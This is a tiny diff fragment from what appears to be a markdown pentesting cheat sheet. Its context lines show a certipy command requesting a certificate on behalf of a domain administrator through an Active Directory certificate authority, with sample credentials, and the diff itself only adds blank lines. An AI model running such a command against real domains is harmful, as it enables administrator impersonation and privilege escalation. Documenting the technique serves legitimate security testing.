@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:24.886746+00:00'
 ```ps1
 $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
 ```
+
+
